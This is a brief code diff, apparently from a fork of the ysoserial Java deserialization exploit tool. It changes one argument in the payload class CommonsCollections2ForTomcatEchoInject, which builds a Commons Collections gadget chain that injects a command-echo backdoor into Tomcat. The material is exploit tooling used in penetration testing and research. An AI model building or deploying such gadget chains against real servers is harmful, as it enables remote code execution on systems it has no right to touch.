@@ -28,7 +28,7 @@ import ysoserial.payloads.util.Reflections;
 public class CommonsCollections2ForTomcatEchoInject implements ObjectPayload<Queue<Object>> {
 
 	public Queue<Object> getObject(final String ... command) throws Exception {
-		final Object templates = Gadgets.createTemplatesImpl(null, TomcatEchoInject.class);
+		final Object templates = Gadgets.createTemplatesImpl(TomcatEchoInject.class);
 		// mock method name until armed
 		final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
 
